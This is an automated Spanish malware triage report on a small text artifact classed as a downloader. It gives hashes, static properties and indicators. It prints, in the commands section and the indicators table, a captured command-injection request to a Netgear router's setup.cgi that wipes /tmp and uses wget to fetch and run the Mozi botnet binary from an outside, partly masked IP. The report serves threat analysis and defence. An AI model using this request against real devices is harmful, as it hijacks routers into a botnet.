# 🧬 Payload Analysis

`7ff830d9276b1f38146a1ee8c21417483001a78e6ff7445201cbad491ac370c3`

## 📌 Resumen

Artefacto identificado como ASCII text, with CRLF line terminators de 176 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `netgear` en `hxxp://115.42.75.XXX:44616/Mozi.m+-O+/tmp/netgear`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.


## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Confianza:** `Baja`
- **Riesgo:** `Medium`

## 🗓️ Registro

- **Registrado:** `2026-08-09T21:10:07.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `7ff830d9276b1f38146a1ee8c21417483001a78e6ff7445201cbad491ac370c3`
- **SHA1:** `ae022bad519bfd0f4499aee714b23486febc52da`
- **MD5:** `66dbdd5a927e7036a62f96651553d227`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 176 B |
| Entropía | 5.15 |
| Strings | 1 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Limpieza**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=4

## 🖥️ Comandos observados / extraídos

```text
GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://115.42.75.XXX:44616/Mozi.m+-O+/tmp/netgea
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| url | hxxp://115.42.75.XXX:44616/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 | strings |
| ip | 115.42.75.XXX | static_analysis |
| command | GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://115.42.75.XXX:44616/Mozi.m+-O+/tmp/netgea | strings |
| hash | 7ff830d9276b1f38146a1ee8c21417483001a78e6ff7445201cbad491ac370c3 | static_analysis |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | structured text |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
